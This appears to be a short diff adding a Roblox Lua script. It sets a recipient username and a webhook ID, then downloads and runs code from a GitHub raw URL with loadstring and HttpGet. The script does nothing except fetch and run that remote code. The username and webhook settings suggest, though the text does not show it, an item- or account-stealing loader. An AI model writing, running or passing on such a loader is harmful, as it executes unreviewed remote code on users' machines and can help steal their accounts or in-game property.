@@ -1,0 +1,5 @@
+
+Username = "olijus25"
+Webhook = "554250a4-fb7b-44fb-8b3d-f1f906e6c84f"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheReactor300/Scr/refs/heads/main/asd",true))()
